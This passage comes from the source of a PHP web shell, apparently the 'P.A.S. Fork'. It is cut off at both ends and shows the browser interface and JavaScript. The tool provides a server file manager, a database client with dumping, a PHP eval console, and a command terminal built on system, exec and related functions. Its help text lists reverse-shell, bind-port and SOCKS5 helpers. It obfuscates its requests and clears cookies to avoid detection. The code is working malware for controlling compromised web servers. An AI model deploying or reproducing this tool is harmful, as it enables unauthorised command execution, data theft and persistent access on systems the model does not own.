    opt = ' <port> [options]\nOptions (option value can\'t contain whitespace):\n  -i <file>  Use interpreter <file>. Default: ',
    perl = '<?php echo NIX?"/usr/bin/perl":"perl.exe";?>\n',
    pthn = '<?php echo NIX?"/usr/bin/python":"python.exe";?>\n',
    opta = '  -a <addr>  Listen only on IP address <addr>. Default listening on all adresses\n',
    optn = '  -n <name>  Set process name to <name>. Default value is secret ;)\n',
    opts = '  -s <file>  Use shell <file>. Default: <?php echo NIX?"/bin/sh":"cmd";?>\n',
    optt = '  -t         Open PTY\n',
    optl = '  -s <u:p>   Secure with authentication (u - username, p - password)\n',
    ign = '     u - Users and Groups;\n     e - Environment;\n     p - Processes;\n     n - Network;\n';
   if (val[0] === 'backconnect.perl' && val.length < 3) prntMsg(usg + ' <ip>' + opt + perl + opts + optn);
   else if (val[0] === 'bindport.perl' && val.length < 2) prntMsg(usg + opt + perl + opta + opts + optn);
   else if (val[0] === 'socks5.perl' && val.length < 2) prntMsg(usg + opt + perl + opta + optl + optn);
   else if (val[0] === 'backconnect.python' && val.length < 3) prntMsg(usg + ' <ip>' + opt + pthn + opts + optt);
   else if (val[0] === 'bindport.python' && val.length < 2) prntMsg(usg + opt + pthn + opta + opts + optt);
   else if (val[0] === 'socks5.python' && val.length < 2) prntMsg(usg + opt + pthn + opta + optl);
   else if (val[0] === 'report' && val[1] === '?') prntMsg(usg + ' [options]\nOptions:\n  -f <file>   Save report to <file>\n  -s [flags]  Skip some information\n     Flags:\n<?php echo NIX?'o-OS Identification;\n l-Langs;\n c-CPU;\n r-Cron;\n h-Histories;\n f-File System;\n s-SUID Files;\n':'s-System Info;\n t-Tasks;\n r-Share;\n';?>' + ign);
   else {
    val = elmById('spnPth').textContent;
    ajxSnd(elmById('spnUsrHst').textContent + ':' + val + '$ ' + cmd, onExec, frm, {
     a: 't',
     p: val
    }, elmById('slctTrmCS').value);
   }
  }
 }
 frm.e.value = '';
 return false;
}

function onExec(div, data) {
 var cmd = div.childNodes[1].textContent.slice(0, -2);
 if (data === '\x03\x1E') return uiChngMsg(div, 'Error in command: ' + cmd, 'Err');
 data = data.slice(0, -3);
 var pos = data.lastIndexOf('\x03\x1E\x02\x0A');
 if (pos > -1) {
  var inf = data.slice(pos + 4).split('\n', 3);
  elmById('spnUsrHst').textContent = inf[0] + '@' + inf[1];
  elmById('spnPth').textContent = inf[2];
  data = data.slice(0, pos);
 } else data += '\n';
 if(elmById('cbIT').checked){
	elmById('divTrm').append(elmById('preTrm'));
	elmById('preTrm').textContent = cmd + '\n' + data + '\n' + elmById('preTrm').textContent;
 }
 else{
	elmById('divTrm').prepend(elmById('preTrm'));
	elmById('preTrm').textContent += cmd + '\n' + data + '\n';
	pos = elmById('divTrm');
	pos.scrollTop = pos.scrollHeight;
 }
 uiDelMsg(div);
}

function trmSaveState() {
 if (exeFuncs.length === 0) return;
 var e = elmById('frmTrm');
 strgSaveStr('trmShell', e.s.value);
 strgSaveBool('trmSilent', e.h.checked);
 strgSaveOpt('trmFunc', e.f.value);
 strgSaveOpt('trmLoadAs', e.c.value);
 strgSaveOpt('trmSendAs', elmById('slctTrmCS').value);
 strgSaveStr('trmPath', elmById('spnPth').textContent);
 strgSaveArr('trmHist', trmHist);
}

function trmRestoreState() {
 var cnt = exeFuncs.length;
 if (cnt === 0) {
  elmById('tabTrm').style.display = 'none';
  return;
 }
 var frm = elmById('frmTrm'),
  val = sessionStorage.getItem('trmFunc') | 0;
 for (var i = 0; i < cnt; ++i) {
  var opt = new Option(exeFuncs[i][1], exeFuncs[i][0]);
  if (exeFuncs[i][0] === val) opt.selected = true;
  frm.f.add(opt);
 }
 elmById('spnUsrHst').textContent = exeFuncs[0][2];
 val = sessionStorage.getItem('trmPath');
 elmById('spnPth').textContent = val === null ? exeFuncs[0][3] : val;
 strgRstrVal('trmShell', frm.s);
 strgRstrChck('trmSilent', frm.h);
 strgRstrVal('trmSendAs', 'slctTrmCS');
 strgRstrVal('trmLoadAs', frm.c);
}

function uiUpdInf(chld) {
 var div = elmById('divInfo');
 div.removeChild(div.lastChild);
 div.appendChild(chld);
}

function onInfMain(div, data) {
 var tbl = newElm('table', {
  id: 'tblInf'
 });
 for (var i = 0, l = data.length; i < l; ++i) {
  if (i > 0) tbl.insertRow(-1).appendChild(newElm('th', {
   colSpan: 2
  }));
  for (var key in data[i]) {
   var tr = tbl.insertRow(-1);
   tr.appendChild(newElm('th', {
    textContent: key
   }));
   tr.insertCell(1).textContent = data[i][key];
  }
 }
 uiUpdInf(tbl);
 uiDelMsg(div);
}

function onInfPHP(div, data) {
 var tbl = document.createElement('table');
 tbl.id = 'tblInf';
 for (var sct in data) {
  var tr = tbl.insertRow(-1);
  tr.appendChild(newElm('th', {
   colSpan: 2,
   textContent: sct
  }));
  for (var key in data[sct]) {
   tr = tbl.insertRow(-1);
   tr.appendChild(newElm('th', {
    textContent: key
   }));
   tr.insertCell(1).textContent = data[sct][key];
  }
 }
 uiUpdInf(tbl);
 uiDelMsg(div);
}

function ajxSnd(msg, clbck, frm, data, chrst) {
	
	RO = elmById('cbRO').checked;
	RR = elmById('cbRR').checked;
	TM = elmById('cbTM').checked;
	OI = elmById('cbOI').checked;
	
	 function obfuscate(data) {
	  if (obfKey === false || data.length < 2) return data;
	  var r = [],
	   l = data.length;
	  data = data.split('');
	  for (var i = 0; i < l; ++i) {
	   var c = (i % 2 === 0) ? data.pop() : data.shift();
	   r.push(c === obfKey ? '' : c);
	  }
	  return r.join(obfKey);
	 };
	
	 function cancel() {
	  document.body.removeChild(reqIfrm);
	  uiDelMsg(msgDiv);
	  return false;
	 };
	
	 function onResp() {
	  deleteAllCookies();
	  msgDiv.firstChild.onclick = uiClsMsg;
	  var doc = reqIfrm.contentDocument,
	   data = RO ? doc.body.textContent : getValue(doc.body.textContent),
	   cset = doc.characterSet;
	  document.body.removeChild(reqIfrm);
	  if (data.slice(0, 2) === '\x01\x02') {
	   if (data.slice(-3) === '\x17\x04\x10' && data.indexOf('\x03\x1E')) data = data.slice(2, -3);
	   else data = false;
	  } else try {
	   data = JSON.parse(data);
	  } catch (e) {
	   data = false;
	  }
	  if (data === false) uiNetErrMsg(msgDiv);
	  else if (clbck) clbck.call(frm, msgDiv, data, cset);
	  else uiDelMsg(msgDiv);
	 };
	 
	 var msgDiv = uiMsg(msg),
	  obfKey = false,
	  reqIfrm = newElm('iframe', {
	   src: '',
	   name: 'ifrm' + (new Date().getTime())
	  }),
	  reqFrm = newElm('form', {
	   acceptCharset: (chrst ? chrst : 'UTF-8'),
	   action: window.location.href,
	   method: 'post',
	   target: reqIfrm.name
	  }),
	  elm;

	 if (RO) data.ro = '1';
	 if (TM) data.tm = '1';
	 if (obfKey !== false) data.k = obfKey;
	 elm = elmById('frmCstEnv');
	 if (elm.e.checked && elm.i.value !== '') {
	  data.j = [elm.f.value, elm.s.value, elm.i.value, ''];
	  if (elm.n.checked) data.j[3] = 'n';
	  if (elm.c.checked) data.j[3] += 'C';
	 }
	 for (var key in data)
	  if (Array.isArray(data[key]))
	   for (var i = 0, c = data[key].length; i < c; ++i) reqFrm.appendChild(newElm('input', {
	    type: 'hidden',
	    name: RR ? key + '['+ i +']' : setName(key + '['+ i +']'),
	    value: RR ? data[key][i]: setValue(data[key][i])
	   }));
	  else reqFrm.appendChild(newElm('input', {
	   type: 'hidden',
	   name: RR ? key : setName(key),
	   value: RR ? data[key] : setValue(data[key])
	  }));
	 if (frm)
	  for (var i = frm.elements.length - 1; i >= 0; --i) {
	   elm = frm.elements[i];
	   if (elm.name === '' || elm.disabled) continue;
	   if (elm.tagName === 'INPUT') {
	    if ((elm.type === 'checkbox' || elm.type === 'radio') && !elm.checked) continue;
	    if (elm.type === 'file') {
			if(RR){
		     reqFrm.enctype = 'multipart/form-data';
		     reqFrm.appendChild(elm.cloneNode(true));
			}
	     continue;
	    }
	   }
	   if (elm.value !== '' || elm.tagName === 'TEXTAREA') reqFrm.appendChild(newElm('input', {
	    type: 'hidden',
	    name: RR ? elm.name : setName(elm.name),
	    value: RR ? elm.value : setValue(elm.value)
	   }));
	  }

	 document.body.appendChild(reqFrm);
	 addEncKey(reqFrm);
	 
	 status = false;
	 if(COOKIE && reqFrm.enctype != 'multipart/form-data'){
		status = submitViaCookie(reqFrm, false);
		if(status == 'SEND'){
			elements = reqFrm.childNodes;
			while(elements.length)
				for(i = 0; i < elements.length; i++)
					reqFrm.removeChild(elements[i]);
			reqFrm.method = 'get';
		}
		else
			reqFrm.method = 'post';
	 }
	
	 document.body.appendChild(reqIfrm);

	 if(status != 'CANCEL'){
		
		if(OI && reqFrm.method == 'get')
			reqIfrm.src = reqFrm.action;

		else if(!data.hasOwnProperty('d')){
			xhr = new XMLHttpRequest();
			xhr.open(reqFrm.method, '', false);
			xhr.send(new FormData(reqFrm));
			reqIfrm.srcdoc = xhr.response;
		}
		else
			(COOKIE || !OI && reqFrm.method == 'get' ? window.location.href = window.location.pathname : reqFrm.submit());

		reqIfrm.onload = onResp;
	 }

	 document.body.removeChild(reqFrm);	
	 msgDiv.firstChild.onclick = cancel;
	 setTimeout(deleteAllCookies, 100);// sorry :(
	
	 return false;
}
</script>

<script id="dataExe"type="text/data"><?php $a=array('system','passthru','backticks','shell_exec','exec','popen');if(PHP_VERSION>='4.3')$a[]='proc_open';/*if(defined('EXP_EOF')){$a[7]='expect://';$a[8]='expect_popen';}if(!NIX&&defined('CLSCTX_ALL'))$a[10]='com';$s=NIX?';':'&';$c=NIX?'pwd':'cd';$w=NIX?'whoami':'echo %username%';foreach($a as$k=>$v)exe('echo '.$k.':'.$v.$s.$w.$s.'hostname'.$s.$c,$k,'',FALSE);*/foreach($a as $k => $v){if(function_exists($v)) print $k.':'.$v."\n".get_current_user()."\n".gethostname()."\n".__DIR__."\n";}?></script></head><body onkeydown="uiKeyDwn(event)"><div id="divHdr"class="divCntrls"><a href="#"class="cntrl"title="Color mode"onclick="return invertColors()">&#x23FA;</a><a href="#"class="cntrl"title="Resize view"onclick="return uiRszBody()">&#x21C4;</a><a href="#"class="cntrl"title="Settings"onclick="return uiShwModal('divStngs')">&#x2699;</a></div><div id="divBody"><span id="tabFM"><a href="#tabFM"class="tab">File Manager</a><div class="tabPage"id="divFM"><textarea id="txtClpbrd"tabindex="-1"></textarea><form hidden id="frmUpl"><input type="file"name="f[]"id="inpUpl" onchange="uplFiles()"/></form><form class="toolbar"id="frmFM"onsubmit="return goTo(this.p.value)"><a href="#"class="cntrl"id="btnSrch"title="Search..."onclick="return uiShwFrmSrch()"></a><button type="button"title="Go home!"onclick="goTo('~')">~</button> <?php if(!NIX){$a=range('A','Z');foreach($a as$v){$i=new FileInfo($v.':\\');if($i->isDir())echo'<button type="button"onclick="goTo(',"'",$v,":\\\\'",')">',$v,':</button>';}}?> <input type="text"name="p"value="<?php echo escHTML(selfPath());?>"/><button title="Go!">&gt;</button><span class="spnBtnSbMn"><button type="button"id="btnFastAct"title="Fast actions..."onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)"><hr class="arwDwn"/></button><div class="divSbMn"onclick="onFastActClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Properties</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Download</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Delete</a></div></span>&nbsp; <span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="fmCSSend"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"title="Load as..."><hr class="arwDwn"/> <select id="fmCSLoad"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span></form><div class="subbar"><button type="button"title="You can upload multiple files at once..."onclick="elmById('inpUpl').click()">Upload &#8230;</button><span class="spnBtnSbMn"><button type="button"class="btnSbMn"onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)">Create <hr class="arwDwn"/></button><div class="divSbMn"onclick="onCrtMenuClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">File</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Link</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Directory</a></div></span><span class="spnBtnSbMn"><button type="button"class="btnSbMn"id="btnBufferMenu"onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)"disabled>Buffer <hr class="arwDwn"/></button><div class="divSbMn"onclick="onBufferMenuClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Show files<a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Copy here</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Move here</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Download</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Clear</a></div></span></div><div><form id="frmFiles"><table id="tblFiles"cols="<?php echo NIX?8:7;?>"onclick="onTblFilesClick(event)"><thead><tr><th width="20px"><input type="checkbox"onclick="uiCheckAll('Files', this.checked)"/></th><th>Name</th><th width="65px">Ext</th><th width="105px">Size</th><th width="145px">Modified (UTC)</th><th width="95px">Permission</th> <?php if(NIX){?><th width="155px">Owner</th><?php }?> <th width="65px">Actions</th></tr></thead><tfoot><tr><th colspan="<?php echo NIX?8:7;?>"><button type="button"onclick="dwnFiles(getSlctdFiles())">Download</button><button type="button"onclick="prpsSlctdFiles()">Properties</button><button type="button"onclick="markSlctdFiles()">Mark</button><button type="button"onclick="delFiles(getSlctdFiles())">Delete</button></th></tr></tfoot></table></form></div><template id="tmplFilesTBody"><tbody><tr><th colspan="<?php echo NIX?8:7;?>"class="thPth"></th></tr><tr><td class="tdUp"><input type="hidden"/>&#x21b4;</td><td colspan="<?php echo NIX?7:6;?>"><a href="#"class="lnkBlck">[ .. ]</a></td></tr></tbody></template><template id="tmplFileRow"><tr><td><input type="checkbox"name="f[]"/></td><td><a href="#"class="lnkBlck"></a></td><td><a href="#"class="lnkBlck"></a></td><td><a href="#"class="lnkAct"></a></td><td></td><td><a href="#"class="lnkAct"></a></td><?php if(NIX){?><td></td><?php }?><td><a href="#"class="lnkAct">Mrk</a>&nbsp;<a href="#"class="lnkAct">Del</a></td></tr></template><div id="divWndws"><template id="tmplFrmFile"><form class="modal frmFile"onsubmit="saveFile(event)"onmousedown="uiActvModal(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">New File</span><a href="#"class="cntrl"title="Close"onclick="return uiDstrModal(this.parentNode.parentNode)">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz(this.parentNode.parentNode)">&#x2922;</a><a href="#"class="cntrl"title="Reload file"onclick="rldFile(event)">&#x27F3;</a></div><textarea name="t"></textarea><div class="flexRow"><input type="text"required/><select name="c"title="File encoding..."onchange="rldFileAs(event)"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select><select name="e"><option value="0">\r\n</option><option value="1"<?php if(NIX)echo' selected';?>>\n</option><option value="2">\r</option></select><button>Save</button></div></form></template><form id="frmSrch"class="modal"onmousedown="uiActvModal(event)"onsubmit="srchFiles(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Search</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmSrch')">&#x00D7;</a></div><label class="option"title="exx: <?php echo NIX?'/var/www:/etc:/tmp/':'c:\\inetpub\\wwwroot;d:\\www\\';?>">Paths<input type="text"required /></label><div class="flexRow noFlex"><div class="option"> Name (<label title="? - single char; * - zero or more char; [!0123A-Z] - class of chars (- for range, ! to exclude)"><input type="checkbox"name="w"/>wildcard</label>, <label><input type="checkbox"name="i"/>case-insensitive</label>) <input type="text"name="n"/></div><label class="option"title="Max search depth">Depth<input type="text"name="d"size="1"size="1"/></label><label class="option">Type <select name="y"onchange="uiSrchFTypeChngd()"><option value="">Any</option><option value="1">Dirs</option><option value="0">Files</option></select></label><label class="option">Mode <select name="p"><option value="">Any</option><option value="1">Readable</option><option value="2">Writable</option><option value="3">Full access</option></select></label> <?php if(NIX){?> <label class="option"> Attribute <select name="u"><option value="">Any</option><option value="1">SUID</option></select></label></div><div class="flexRow"><label class="option"title="exx: 0, &gt;1000, &lt;1005, 1010-1015">Owner id<input type="text"name="o"/></label><hr class="spcr20"/><label class="option"title="exx: 0, &gt;1000, &lt;1005, 1010-1015">Group id<input type="text"name="g"/></label> <?php }?> </div><div class="flexRow"><label class="option"title="exx: &gt;1991-08-24 00:00:00, &lt;1991-08-24 00:00:00, 1991-08-24 00:00:00 - 1996-06-28 12:00:00, 1996-06-28 12:00:00">Created (UTC)<input type="text"name="e"/></label><hr class="spcr20"/><label class="option"title="exx: &gt;1991-08-24 00:00:00, &lt;1991-08-24 00:00:00, 1991-08-24 00:00:00 - 1996-06-28 12:00:00, 1996-06-28 12:00:00">Modified (UTC)<input type="text"name="m"/></label></div><div class="flexRow"><label class="option"title="exx: &gt;10, &lt;102400, 10-1024, 2048">Size (bytes)<input type="text"name="z"/></label><hr class="spcr20"/><div class="option">Text (<label title="Delimiter is pound (#)"><input type="checkbox"name="x"/>use regex</label>, <label><input type="checkbox"name="v"/>case-insensitive</label>)<input type="text"name="t"/></div></div><div class="flexRow"><label><input type="checkbox"name="l"/> Process links</label><hr class="spcrFlex"/><button>Search</button></div></form><form id="frmLnk"class="modal"onmousedown="uiActvModal(event)"onsubmit="mkLnk(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Create Link</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmLnk')">&#x00D7;</a></div><label class="option">Target Path: <input type="text"name="p"required/></label><label class="option">Link Path: <input type="text"required/></label><div class="flexRow"><select name="t"><option value="0">Symbolic</option><option value="1">Hard</option></select><hr class="spcrFlex"/><button>Create</button></div></form><template id="tmplFrmPrps"><form class="modal frmFilesPrps"onmousedown="uiActvModal(event)"onsubmit="chngPrps(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Properties</span><a href="#"class="cntrl"title="Close without saving"onclick="return uiDstrModal(this.parentNode.parentNode)">&#x00D7;</a></div><label class="option">Path<input type="text"name="p"request/></label><div class="flexRow"><label class="option">Modified (UTC) <a href="#"class="cntrl arwDwn"onclick="setErlDate(event)"title="Set the earliest date from table"></a><input type="text"size="1"name="t"/></label> <?php if(NIX){?> <hr class="spcr20"/><label class="option">Permission<input type="text"size="1"name="e"/></label><hr class="spcr20"/><label class="option">Owner<input type="text"size="1"name="o"/></label><hr class="spcr20"/><label class="option">Group<input type="text"size="1"name="r"/></label></div><div class="flexRow"> <?php }?> <hr class="spcrFlex"/><button >Save</button></div></form></template><form id="frmBuffer"class="modal"onmousedown="uiActvModal(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Buffer</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmBuffer')">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz('frmBuffer')">&#x2922;</a></div><table id="tblBuffer"onclick="onTblBufferClick(event)"><thead><tr><th width="20px"><input type="checkbox"onclick="uiCheckAll('Buffer', this.checked)"/></th><th>File</th><th width="35px">Act</th></tr></thead><tfoot><tr><th colspan="3"><button type="button"onclick="unmarkFiles()">Remove</button></th></tr></tfoot></table><template id="tmplBufferRow"><tr><td><input type="checkbox"name="f[]"/></td><td><a href="#"></a></td><td><a href="#"class="lnkAct">Rm</a></td></tr></template></form></div></div></span><span id="tabSQL"><a href="#tabSQL"class="tab">SQL Client</a><div class="tabPage"id="divPageSQL"><form class="toolbar"id="frmCnnct"onsubmit="return cnnct()"><select name="e"> <?php $a=array('MYSQL_NUM'=>array('MySQL','MySQL'),'MYSQLI_NUM'=>array('MySQLi','MySQLi'),'PDO::MYSQL_ATTR_INIT_COMMAND'=>array('MySQLPDO','MySQL (PDO)'),'MSSQL_NUM'=>array('MSSQL','MSSQL'),'SQLSRV_ERR_ALL'=>array('SQLSrv','MSSQL (SQLSrv)'),'PDO::PARAM_INT'=>array('MSSQLDBLIB','MSSQL (PDO_DBLIB)'),'PDO::PARAM_STR'=>array('MSSQLODBC','MSSQL (PDO_ODBC)'),'PDO::SQLSRV_ENCODING_UTF8'=>array('SQLSrvPDO','MSSQL (PDO_SQLSRV)'),'PGSQL_NUM'=>array('PGSQL','PostgreSQL'),'PDO::PARAM_LOB'=>array('PGSQLPDO','PostgreSQL (PDO)'));foreach($a as$k=>$v)if(defined($k))echo'<option value="',$v[0],'">',$v[1],'</option>';?> </select><input type="text"name="h"placeholder="Host"/><input type="text"name="u"placeholder="User"/><input type="text"name="p"placeholder="Password"/><input type="text"name="b"placeholder="Base"/><button>&gt;</button></form><div class="subbar"><span class="spnChrst"> <hr class="arwUp"/> <select id="sqlCSSend"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span><span class="spnChrst"><hr class="arwDwn"/> <select id="sqlCSLoad"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?> </select></span></div><div id="divSQL"><div id="divSQLWrpLeft"><div class="panel"><label><input type="checkbox"id="cbCR"/> Count number of rows</label></div><div class="panel"><div id="divSchm"></div></div><div class="panel"id="divDump">Dump as <select id="slctDmpFrmt"><option value="0">SQL</option><option value="1">CSV</option></select><button type="button"onclick="dump()">&gt;</button></div></div><div id="divSQLWrpRight"><form class="panel flexRow"id="frmSQL"onsubmit="return query()"><input type="text"name="q"placeholder="SQL query"/><button>&gt;</button></form><div id="divCptn"></div><div id="divData"><table id="tblHead"></table><table id="tblData"></table></div><form class="panel"id="frmPg"onsubmit="return chngPg(0)"><input type="hidden"name="b"/><input type="hidden"name="s"/><input type="hidden"name="t"/> Start from row <button type="button"onclick="chngPg(-1)">&lt;</button><input type="text"name="o"size="5"value="0"/><button type="button"onclick="chngPg(1)">&gt;</button><div style="float:right">Rows per page <input type="text"name="r"size="3"value="25"/><button>&gt;</button></div></form></div></div></div></span><span id="tabPHP"><a href="#tabPHP"class="tab">PHP Console</a><div class="tabPage"id="divPagePHP"><form class="toolbar"id="frmPHP"onsubmit="return evl()"><label><a href="#"title="Change composition"class="cmpsRow"id="aCmps"onclick="return uiChngCmps()">Composition</a></label><label title="Erase PHP code after successful eval"><input type="checkbox"id="cbClnInp"/> Clear input</label><label title="Erase previous results before show new"><input type="checkbox"id="cbClnOut" checked/> Clear output</label><label title="Render result as HTML"><input type="checkbox"id="cbHTML"/> Show as HTML</label><label><input type="checkbox"name="h"/> Hide PHP errors</label><div><span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="slctPHPCS"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"title="Load as..."><hr class="arwDwn"/> <select name="c"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span><button id="sbmPHP"title="Press Ctrl + Enter to evaluate code">Eval</button></div></form><div id="divPHP"><textarea name="e"form="frmPHP"id="txtPHP"placeholder="phpinfo();"onkeydown="onPHPKeyDwn(event)"></textarea><pre id="prePHP"onkeydown="onPHPResKeyDwn(event)"tabindex="-1"></pre></div></div></span><span id="tabTrm"><a href="#tabTrm"class="tab">Terminal</a><form class="tabPage"id="frmTrm"onsubmit="return exec()"><div class="toolbar"><label class="flexRow"title="Shell must be able to accept command from the argument 'c' (e.g.: $<?php echo NIX?"/bin/shell -c 'uname -a; id'":"cmd /c 'ver; pwd'";?>)">Shell: <input type="text"name="s"placeholder="<?php echo NIX?'/bin/sh':'';?>"/></label><label><input type="checkbox"name="h"> Don't show errors</label><label><input type="checkbox" id="cbIT"/>Invert output</label><label>Use function: <select name="f"></select></label><div><span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="slctTrmCS"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"style="text-align:right"title="Load as..."><hr class="arwDwn"/> <select name="c"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span></div></div><div id="divTrm"onclick="onTrmClick(event)"><pre id="preTrm"onkeydown="onTrmResKeyDwn(event)"tabindex="-1"></pre><div class="flexRow"><span id="spnUsrHst"></span>:<span id="spnPth"></span>$&nbsp;<input type="text"name="e"id="inpTrm"onkeydown="onTrmInpKeyDwn(event)"autocomplete="off"/></div></div></form></span><span id="tabInf"><a href="#tabInf"class="tab">Information</a><div class="tabPage"id="divInfo"><div class="toolbar"><div><a href="#"class="lnkAct"onclick="return ajxSnd('Get main info', onInfMain, null, {a:'i',t:'m'})">Main</a> / <a href="#"class="lnkAct"onclick="return ajxSnd('Get php info', onInfPHP, null, {a:'i',t:'p'})">PHP</a> / </div></div> <?php infMain(TRUE);?></div></span></div><div class="panel"id="divFtr"><div>P.A.S. Fork v. <?php echo VER;?></div><div id="divDtTm"title="Server Time"><span></span></div><div><a href="#"id="actLog"title="Message log"onclick="return uiShwModal('divLog')">&#x26A0;</a></div></div><div class="modal"onmousedown="uiActvModal(event)"id="divStngs"tabindex="-1"><div class="divCntrls">	<span class="spnTitle">Settings</span>	<a href="#"class="cntrl"title="Close"onclick="return uiClsModal('divStngs')">&#x00D7;</a></div>	<label class="option"><input onclick="COOKIE = (this.checked ? 1 : 0)" type="checkbox" id="cbCO"/> Use cookie to request</label>	<label class="option"><input type="checkbox" id="cbRR"/> Skip request encoding</label><label title="Raw Output mode for big files.&#10;Skip response encoding ('ob_*')." class="option"><input type="checkbox" id="cbRO"/> Skip response encoding</label><label title="Shown in File Manager" class="option"><input type="checkbox" id="cbTM"/> <b>ctime</b> instead of <b>mtime</b></label><label class="option"><input type="checkbox" id="cbOI"/> <b>iframe</b> instead of <b>xhr</b></label><form id="frmCstEnv"onsubmit="return false"><fieldset id="fldEnv"><legend><label><input type="checkbox"id="e"/> Run in custom environment</label></legend><label>Function: <select name="f"></select></label><label class="option">Shell: <input type="text"name="s"placeholder="<?php echo NIX?'/bin/sh':'';?>"/></label><label class="option">Interpreter: <input type="text"name="i"value="<?php if(PHP_VERSION>='5.4')echo escHTML(PHP_BINARY);?>"/></label><label class="option"><input type="checkbox"name="n"/> -n &nbsp;No php.ini file will be used</label><label class="option"><input type="checkbox"name="c"/> -C &nbsp;Do not chdir to the script's directory</label></fieldset></form></div><div class="modal"onmousedown="uiActvModal(event)"id="divLog"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Message Log</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('divLog')">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz('divLog')">&#x2922;</a><a href="#"class="cntrl"title="Clear"onclick="return clnLog()">&#8802;</a></div><div id="divLogCntn"></div></div><div id="divMsgs"class="divCntrls"></div></body>
<?php if($GLOBALS['ACECONF']['URL']){ ?>
<script>
function aceEditorProcess(element){

	if(typeof ace == 'undefined'){
		var aceScript = document.createElement('script');
		aceScript.src = '<?=$GLOBALS['ACECONF']['URL']?>';
		document.body.appendChild(aceScript);
		
		aceScript.onload = function(){
			aceEditor = [];
			aceEditorProcess(element);
		}
		
		return false;
	}
	
	var aceEditorModes = ['php', 'perl', 'python', 'sql', 'sh', 'javascript', 'powershell', 'apache_conf', 'nginx'];
	var aceEditorThemes = ['crimson_editor', 'eclipse', 'dreamweaver', 'solarized_light', 'xcode', 'katzenmilch', 'dawn', 'iplastic', 'monokai', 'cobalt', 'nord_dark'];
	var parentForm = getParentFormOf(element);
	var eId = parentForm.name = (parentForm.name ? parentForm.name : Math.random().toString(36).substring(2, 15));
	var flexRow = parentForm.children[2];
	var textArea = parentForm.elements[0];
	var saveButton = parentForm.elements[4];
	var closeButton = parentForm.children[0].children[1];
	var aceEditorDiv = parentForm.children[eId];
	var aceEditorModeSelect = flexRow.children[1];
	var aceEditorThemeSelect = flexRow.children[2];

	if(aceEditorDiv){
		parentForm.removeChild(aceEditorDiv);
		flexRow.removeChild(aceEditorModeSelect);
		flexRow.removeChild(aceEditorThemeSelect);
		textArea.value = aceEditor[eId].getValue();
		textArea.style.display = 'inline';
		saveButton.setAttribute('onclick', '');
		closeButton.setAttribute('onclick', 'return uiDstrModal(this.parentNode.parentNode)');
		delete aceEditor[eId];
		
		return false;
	}

	var aceEditorDiv = document.createElement('div');
	aceEditorDiv.id = eId;
	aceEditorDiv.contentEditable = 'true';
	aceEditorDiv.style = 'border: 1px solid #7f7f7f; height: 100%; margin: 2px; font-size: 12px;';
	aceEditorDiv.textContent = textArea.value;
	parentForm.insertBefore(aceEditorDiv, parentForm.children[3]);
	parentForm.setAttribute('onmousedown', 'if(event.srcElement.className != "ace_content") uiActvModal(event)');
	saveButton.setAttribute('onclick', 'getParentFormOf(this).elements[0].value = aceEditor[\'' + eId + '\'].getValue()')
	closeButton.setAttribute('onclick', 'delete aceEditor[\'' + eId + '\'];' + closeButton.getAttribute('onclick'));

	textArea.style.display = 'none';
	if(!textArea.setterRedefined){
	    Object.defineProperty(textArea, 'value', {
			set(value){
				this.setterRedefined = true;
				if(aceEditor[eId])
					aceEditor[eId].setValue(value, -1);
				return Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(this, value);
			},
			get(){
				return Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').get.call(this);
			}
	    });
	}

	aceEditor[eId] = ace.edit(eId);
	aceEditor[eId].setFontSize('14px');
	aceEditor[eId].setTheme('ace/theme/<?=$GLOBALS['ACECONF']['THEME']?>');
	aceEditor[eId].session.setMode('ace/mode/<?=$GLOBALS['ACECONF']['MODE']?>');
	aceEditor[eId].setOption('showPrintMargin', false);
	aceEditor[eId].session.setUseWorker(false);
	aceEditor[eId].setBehavioursEnabled(true);
	
	new ResizeObserver((function(){if(aceEditor[eId]) aceEditor[eId].resize()})).observe(parentForm);

